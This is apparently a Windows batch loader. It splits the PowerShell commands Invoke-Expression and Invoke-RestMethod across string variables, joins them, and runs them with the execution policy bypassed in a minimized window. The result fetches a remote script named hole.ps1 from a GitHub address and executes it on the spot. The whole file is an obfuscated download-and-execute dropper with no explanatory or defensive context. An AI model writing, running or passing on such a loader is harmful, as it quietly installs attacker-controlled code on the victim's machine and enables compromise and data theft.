@echo off
set "e1=Invoke"
set "e2=-Expression"
set "e3= ("
set "e4=Invoke-RestMethod"
set "e5= https://github.com/abinadres54-tech/mole/edit/main/hole.ps1)"
set "cmd=%e1%%e2%%e3%%e4%%e5%"
powershell -NoP -NoL -ep Bypass -Win 1 -Command "%cmd%"